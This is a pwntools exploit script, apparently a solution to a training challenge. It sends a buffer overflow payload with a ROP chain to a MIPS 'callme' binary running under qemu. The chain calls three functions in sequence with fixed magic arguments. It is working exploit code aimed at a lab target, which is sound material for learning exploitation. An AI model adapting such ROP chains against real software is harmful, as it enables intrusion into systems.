from pwn import *
io = process("qemu-mipsel -L /usr/mipsel-linux-gnu callme_mipsel",shell=True)

caller = 0x00400bb0 # lw $a0, 0x10($sp); lw $a1, 0xc($sp); lw $a2, 8($sp); lw $t9, 4($sp); jalr $t9; nop;
callme_one = 0x00400d20
callme_two = 0x00400d80
callme_three = 0x00400d10

payload = b""
payload += b"A"*36
payload += p32(caller) + p32(0) + p32(callme_one) + p32(0xd00df00d) + p32(0xcafebabe) + p32(0xdeadbeef)
payload += p32(caller) + p32(0) + p32(callme_two) + p32(0xd00df00d) + p32(0xcafebabe) + p32(0xdeadbeef)
payload += p32(caller) + p32(0) + p32(callme_three) + p32(0xd00df00d) + p32(0xcafebabe) + p32(0xdeadbeef)

io.send(payload)
io.interactive()
